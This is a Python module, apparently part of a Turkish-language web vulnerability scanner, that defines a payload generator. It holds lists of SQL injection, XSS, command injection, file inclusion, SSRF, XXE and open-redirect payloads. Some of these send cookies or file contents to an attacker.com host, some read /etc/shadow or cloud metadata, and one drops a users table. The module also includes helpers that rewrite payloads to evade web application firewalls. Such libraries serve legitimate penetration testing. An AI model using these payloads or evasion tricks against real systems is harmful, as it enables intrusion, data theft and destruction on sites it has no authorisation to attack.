"""
KAXIE Scanner - Dinamik Payload Üretici
"""

import random
import string
import base64
import urllib.parse


class PayloadGenerator:
    """Zafiyet tipine göre dinamik payload üretir."""

    # SQL Injection payload'ları
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1' /*",
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(5000000,SHA1('test'))--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR 1=1 LIMIT 1--",
        "admin' OR 1=1#",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    ]

    # XSS payload'ları
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<input onfocus=alert("XSS") autofocus>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        'javascript:alert("XSS")',
        '<a href="javascript:alert(\'XSS\')">click</a>',
        '<div style="width:expression(alert(\'XSS\'))">',
        '<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("XSS") src=1>">',
        '{{constructor.constructor("return alert(\'XSS\')")()}}',
        '${alert("XSS")}',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<svg/onload=fetch("//attacker.com?c="+document.cookie)>',
    ]

    # RCE payload'ları
    RCE_PAYLOADS = [
        "; id",
        "| id",
        "` id`",
        "$(id)",
        "& id",
        "&& id",
        "|| id",
        "; whoami",
        "| whoami",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; ls -la",
        "| ls -la",
        "; cat /etc/shadow",
        "| cat /etc/shadow",
        "`uname -a`",
        "$(uname -a)",
        "; ping -c 1 127.0.0.1",
        "| ping -n 1 127.0.0.1",
        "& ping -c 1 127.0.0.1",
        "; sleep 5",
        "| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; nslookup attacker.com",
        "| nslookup attacker.com",
        "/bin/sh -c id",
        "python -c 'import os;os.system(\"id\")'",
        "perl -e 'system(\"id\")'",
        "ruby -e 'exec(\"id\")'",
        "php -r 'system(\"id\");'",
    ]

    # LFI payload'ları
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "/etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "/proc/self/environ",
        "/proc/version",
        "/etc/shadow",
        "/etc/hosts",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "php://filter/convert.base64-encode/resource=index",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "expect://id",
        "../../../windows/system32/drivers/etc/hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ]

    # SSRF payload'ları
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0x7f000001",
        "http://2130706433",
        "http://127.1",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://[::ffff:127.0.0.1]",
        "http://0177.0.0.1",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    # XXE payload'ları
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">%eval;%exfil;]><data>1</data>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>1</foo>',
    ]

    # Open Redirect payload'ları
    OPEN_REDIRECT_PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "//evil.com/",
        "https://evil.com%00.target.com",
        "https://evil.com\\@target.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "/\\evil.com",
        "https://evil.com/.target.com",
        "https://target.com@evil.com",
    ]

    # WAF bypass encoding yöntemleri
    @staticmethod
    def url_encode(payload):
        return urllib.parse.quote(payload)

    @staticmethod
    def double_url_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def base64_encode(payload):
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def unicode_encode(payload):
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def html_entity_encode(payload):
        return "".join(f"&#x{ord(c):02x};" for c in payload)

    @staticmethod
    def generate_random_marker():
        return "".join(random.choices(string.ascii_lowercase, k=8))

    def get_waf_bypass_variants(self, payload, vuln_type):
        """WAF atlatma için payload varyasyonları üretir."""
        variants = [payload]

        if vuln_type == "SQLI":
            variants.extend([
                payload.replace(" ", "/**/"),
                payload.replace(" ", "%09"),
                payload.replace(" ", "%0a"),
                payload.replace("OR", "oR"),
                payload.replace("OR", "Or"),
                payload.replace("SELECT", "SeLeCt"),
                payload.replace("UNION", "UnIoN"),
                payload.replace("'", "CHAR(39)"),
            ])
        elif vuln_type == "XSS":
            variants.extend([
                payload.replace("alert", "a" + "lert"),
                payload.replace("<script>", "<ScRiPt>"),
                payload.replace("onerror", "on" + "error"),
                payload.replace("alert", "eval"),
                self.html_entity_encode(payload),
                self.unicode_encode(payload),
                payload.replace("<", "%3c"),
                payload.replace(">", "%3e"),
            ])
        elif vuln_type == "RCE":
            variants.extend([
                payload.replace(" ", "$IFS"),
                payload.replace(" ", "${IFS}"),
                payload.replace(" ", "%09"),
                payload.replace("|", "%7c"),
                payload.replace(";", "%3b"),
                payload.replace("cat", "c'a't"),
                payload.replace("cat", "c\\a\\t"),
                payload.replace("cat", "/bin/c?t"),
            ])

        return list(set(variants))

    def get_payloads(self, vuln_type):
        """Zafiyet tipine göre payload listesi döndürür."""
        payload_map = {
            "SQLI": self.SQLI_PAYLOADS,
            "XSS": self.XSS_PAYLOADS,
            "RCE": self.RCE_PAYLOADS,
            "LFI": self.LFI_PAYLOADS,
            "SSRF": self.SSRF_PAYLOADS,
            "XXE": self.XXE_PAYLOADS,
            "OPEN_REDIRECT": self.OPEN_REDIRECT_PAYLOADS,
        }
        return payload_map.get(vuln_type.upper(), [])
